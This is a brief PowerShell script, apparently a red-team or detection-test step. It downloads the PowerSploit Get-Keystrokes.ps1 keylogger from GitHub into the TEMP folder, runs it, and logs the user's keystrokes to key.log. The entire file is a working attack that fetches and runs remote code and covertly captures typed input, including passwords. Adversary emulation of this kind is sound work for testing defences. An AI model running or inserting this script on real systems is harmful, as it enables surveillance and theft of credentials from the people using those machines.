# Utilize PowerShell and external resource to capture keystrokes Payload Provided by PowerSploit
# Upon successful execution, Powershell will execute Get-Keystrokes.ps1 and output to key.log.
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 
Invoke-WebRequest "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1" -OutFile "$env:TEMP\Get-Keystrokes.ps1"

Set-Location $env:TEMP
.\Get-Keystrokes.ps1 
Get-Keystrokes -LogPath $env:TEMP\key.log 